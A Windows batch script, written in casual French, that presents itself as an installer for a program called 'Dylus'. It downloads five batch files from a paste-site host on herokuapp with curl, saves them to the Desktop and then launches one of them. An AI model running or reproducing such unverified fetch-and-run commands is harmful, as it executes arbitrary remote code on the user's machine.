@echo off
@rem

rem Dire que le fichier s'installe..
    Mode 1000
    echo Dylus est en court d'installation (prépare ton pc bg) (Connexion a internet néecésaire et si ta co est claquée ba va t acheter une co et sa marche lol)
    echo.
    timeout /T 2 /NOBREAK

rem Aller sur le bureau
    cd %HOMEDRIVE%%HOMEPATH%
    cd OneDrive\Desktop
    cd Desktop

rem Téléchargement des fichiers
    echo 0% effectue (Debut du telechargement)
    curl https://hasteb.herokuapp.com/raw/fiqnPKaJch0yq315wNKV.pl --output folder.bat
    echo 20% effectue
    curl https://hasteb.herokuapp.com/raw/oQzsjjLRGRHtCvoYKmhQ --output launch.bat
    echo 40% effectue
    curl http://hasteb.herokuapp.com/raw/vYXhNrPwIYijMnxclC2H.bash --output msgbox.bat
    echo 60% effectue
    curl https://hasteb.herokuapp.com/raw/wRoOAAOrC0tQh3l9Ulv2 --output STARTME.bat
    echo 80% effectue
    curl https://hasteb.herokuapp.com/raw/KE5CMHFZAJTFyX7Q5pVO --output text.bat
    echo 100% effectue (Telechargement termine)

rem Lancement du fichier principal
    echo L'assistant Dylus a fini l'installation... Lancement de Dylus...
    timeout /T 5
    start STARTME.bat
    exit